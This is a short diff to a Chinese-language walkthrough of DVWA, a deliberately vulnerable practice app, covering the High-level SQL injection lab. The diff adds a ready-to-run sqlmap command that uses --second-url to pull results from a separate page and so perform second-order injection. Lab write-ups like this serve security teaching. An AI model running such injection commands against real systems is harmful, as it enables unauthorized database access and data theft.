@@ -2320,6 +2320,10 @@ if( isset( $_SESSION [ 'id' ] ) ) {
 
 需要特别提到的是，High 级别的查询提交页面与查询结果显示页面不是同一个，也没有执行 302 跳转，这样做的目的是为了防止一般的 sqlmap 注入，因为 sqlmap 在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。
 
+可以通过指定 --second-url 去进行二阶注入
+
+`sqlmap -r /root/1.txt -p id --second-url "http://<服务器的地址>/dvw/vulnerabilities/sqli/"`
+
 ### Impossible
 **服务器端核心代码**
 ```php
